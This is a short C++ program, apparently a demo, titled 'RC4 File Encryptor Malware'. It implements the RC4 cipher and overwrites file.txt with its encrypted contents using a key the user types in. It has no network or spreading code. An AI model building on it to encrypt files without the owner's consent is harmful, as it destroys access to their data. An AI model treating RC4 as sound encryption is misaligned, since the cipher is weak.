#include <iostream>
#include <fstream>
#include <vector>
#include <string>

using namespace std;

// KSA - Key Scheduling Algorithm
void KSA(const string &key, unsigned char S[256])
{
    for (int i = 0; i < 256; i++)
    {
        S[i] = i;
    }

    int j = 0;

    for (int i = 0; i < 256; i++)
    {
        j = (j + S[i] + (unsigned char)key[i % key.length()]) % 256;

        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
}

// PRGA - Pseudo-Random Generation Algorithm
vector<unsigned char> PRGA(unsigned char S[256], int length)
{
    vector<unsigned char> keystream;

    int i = 0;
    int j = 0;

    for (int n = 0; n < length; n++)
    {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;

        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;

        unsigned char k = S[(S[i] + S[j]) % 256];

        keystream.push_back(k);
    }

    return keystream;
}

// RC4
vector<unsigned char> RC4(const string &key,
                          const vector<unsigned char> &data)
{
    unsigned char S[256];

    KSA(key, S);

    vector<unsigned char> keystream =
        PRGA(S, data.size());

    vector<unsigned char> output(data.size());

    for (int i = 0; i < data.size(); i++)
    {
        output[i] = data[i] ^ keystream[i];
    }

    return output;
}

int main()
{
    string key;

    cout << "       RC4 File Encryptor Malware \n";
    cout << "          ENCRYPTOR\n";

    cout << "Enter encryption key: ";
    cin >> key;

    if (key.length() == 0)
    {
        cout << "Error: Key cannot be empty.\n";
        return 1;
    }

    ifstream inFile("file.txt", ios::binary);

    if (!inFile)
    {
        cout << "ERROR: Could not open file.txt.\n";
        return 1;
    }

    vector<unsigned char> original;

    char c;

    while (inFile.get(c))
    {
        original.push_back((unsigned char)c);
    }

    inFile.close();

    cout << "Read " << original.size()
         << " bytes from file.txt.\n";

    /*
       Verification data.

       The decryptor uses this information to determine
       whether the entered key produced the expected result.
       The actual secret key is NOT stored here.
    */

    string marker = "RC4_VERIFIED";

    vector<unsigned char> dataToEncrypt;

    for (int i = 0; i < marker.length(); i++)
    {
        dataToEncrypt.push_back((unsigned char)marker[i]);
    }

    for (int i = 0; i < original.size(); i++)
    {
        dataToEncrypt.push_back(original[i]);
    }

    vector<unsigned char> encrypted =
        RC4(key, dataToEncrypt);

    ofstream outFile("file.txt",
                     ios::binary | ios::trunc);

    if (!outFile)
    {
        cout << "ERROR: Could not write to file.txt.\n";
        return 1;
    }

    for (int i = 0; i < encrypted.size(); i++)
    {
        outFile.put((char)encrypted[i]);
    }

    outFile.close();

    cout << "\nEncryption complete.\n";
    cout << "file.txt now contains encrypted binary data.\n";

    return 0;
}
